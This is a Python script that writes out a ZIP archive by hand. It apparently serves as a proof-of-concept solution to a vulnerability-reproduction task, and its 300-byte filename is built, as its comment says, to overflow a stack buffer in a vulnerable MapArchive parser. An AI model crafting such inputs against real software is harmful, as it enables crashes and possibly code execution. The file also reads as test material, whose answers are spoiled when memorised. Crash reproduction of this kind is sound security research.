import struct
import zlib


def _le16(x: int) -> bytes:
    return struct.pack("<H", x & 0xFFFF)


def _le32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def _build_zip_single_file(filename: bytes, data: bytes) -> bytes:
    if not isinstance(filename, (bytes, bytearray)):
        filename = bytes(filename)
    if not isinstance(data, (bytes, bytearray)):
        data = bytes(data)

    crc = zlib.crc32(data) & 0xFFFFFFFF
    fn_len = len(filename)

    # Local file header
    local = b"".join(
        [
            _le32(0x04034B50),  # signature
            _le16(20),          # version needed
            _le16(0),           # flags
            _le16(0),           # compression (store)
            _le16(0),           # mod time
            _le16(0),           # mod date
            _le32(crc),         # crc32
            _le32(len(data)),   # compressed size
            _le32(len(data)),   # uncompressed size
            _le16(fn_len),      # filename length
            _le16(0),           # extra length
            filename,           # filename
            data,               # file data
        ]
    )

    # Central directory header
    central = b"".join(
        [
            _le32(0x02014B50),  # signature
            _le16(20),          # version made by
            _le16(20),          # version needed
            _le16(0),           # flags
            _le16(0),           # compression
            _le16(0),           # mod time
            _le16(0),           # mod date
            _le32(crc),         # crc32
            _le32(len(data)),   # compressed size
            _le32(len(data)),   # uncompressed size
            _le16(fn_len),      # filename length
            _le16(0),           # extra length
            _le16(0),           # comment length
            _le16(0),           # disk number start
            _le16(0),           # internal attrs
            _le32(0),           # external attrs
            _le32(0),           # local header offset
            filename,           # filename
        ]
    )

    # End of central directory record
    eocd = b"".join(
        [
            _le32(0x06054B50),      # signature
            _le16(0),               # disk number
            _le16(0),               # disk start
            _le16(1),               # entries on disk
            _le16(1),               # total entries
            _le32(len(central)),    # central dir size
            _le32(len(local)),      # central dir offset
            _le16(0),               # comment length
        ]
    )

    return local + central + eocd


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Filename > 256 bytes to trigger stack buffer overflow in vulnerable MapArchive
        filename = b"A" * 300
        data = b"X"
        return _build_zip_single_file(filename, data)